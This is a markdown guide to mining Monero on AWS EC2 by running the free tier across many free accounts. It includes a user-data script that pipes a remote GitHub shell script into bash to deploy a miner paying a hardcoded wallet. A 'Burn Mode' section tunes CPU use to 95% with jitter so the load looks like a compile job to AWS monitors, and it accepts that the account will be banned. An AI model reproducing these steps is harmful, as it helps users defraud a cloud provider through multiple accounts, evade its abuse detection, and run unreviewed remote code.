# AWS EC2 Fast Payout Strategy

This guide explains how to use AWS EC2 instances to reach your first mining payout in the shortest possible time using the **"Burn and Rotate"** strategy.

## The Strategy: "Swarm of Micro-Workers"
A single AWS Free Tier instance (`t3.micro`) is slow. To get paid **every 24 hours**, you need a total hashrate of at least **3,000 H/s**.

**How to achieve this for free:**
- **Option A**: Launch 10 instances across different AWS regions (US-East, US-West, EU-West) using multiple free accounts.
- **Option B**: Use AWS "Spot Instances" if you have a $25-50 credit code (often given at AWS events or via startups).

---

## 1. Profit Calculation (Per Instance)

| Instance Type | vCPUs | Hashrate (Turbo) | Daily Profit | Payout Time (0.003 XMR) |
| :--- | :--- | :--- | :--- | :--- |
| **t3.micro (Free Tier)** | 2 (Shared) | ~300 H/s | ~$0.01 | 30-40 Days |
| **c5.large (2 vCPU)** | 2 (Dedicated) | ~1,200 H/s | ~$0.05 | 6-8 Days |
| **c5.2xlarge (8 vCPU)**| 8 (Dedicated) | ~4,800 H/s | ~$0.20 | **24-36 Hours** |

**To maximize profit with many accounts:**
If you run **10 accounts** each with a `t3.micro`, your collective hashrate is **3,000 H/s**.
- **Collective Daily Profit**: ~$0.15 - $0.25.
- **Collective Payout Frequency**: **Every 2-3 Days.**

---

## 2. Step-by-Step EC2 Setup

1.  **Log in** to your [AWS Management Console](https://console.aws.amazon.com/).
2.  **Navigate to EC2** → **Instances** → **Launch Instances**.
3.  **Configure Instance**:
    - **Name**: `lumen-worker-01`
    - **OS**: `Ubuntu 22.04 LTS` (64-bit x86 or ARM).
    - **Instance Type**: `t3.micro` (Free Tier Eligible) or `c6g.medium` (if you have ARM credits).
    - **Key Pair**: Create a new one or use an existing one to SSH.
4.  **Advanced Details** → **User Data**:
    Paste this script to automate the entire setup on launch:
    ```bash
    #!/bin/bash
    export WALLET="45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa"
    export RELAY="wss://your-relay-url.onrender.com"
    export TURBO="true"
    
    curl -s https://raw.githubusercontent.com/naia231/naira/main/scripts/vps_deploy.sh | bash -s -- --wallet $WALLET --relay $RELAY --turbo $TURBO
    ```
5.  **Launch**.

---

## 3. "Safe yet Quicker" (The Burn Mode)
If you are okay with the account being banned after 1-2 weeks in exchange for max profit:
1.  Set `ARC_CPU_MAX=95`.
2.  Set `ARC_JITTER_INTERVAL=60` (frequent changes confuse simple monitors).
3.  **Don't use 100%**: 100% CPU is an instant "red flag" for AWS. **95% with jitter** looks like a heavy compilation or rendering job.

---

## 4. Monitoring
Go to the [MoneroOcean Dashboard](https://moneroocean.stream/#/dashboard?addr=45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa) to see your AWS workers appearing in real-time.
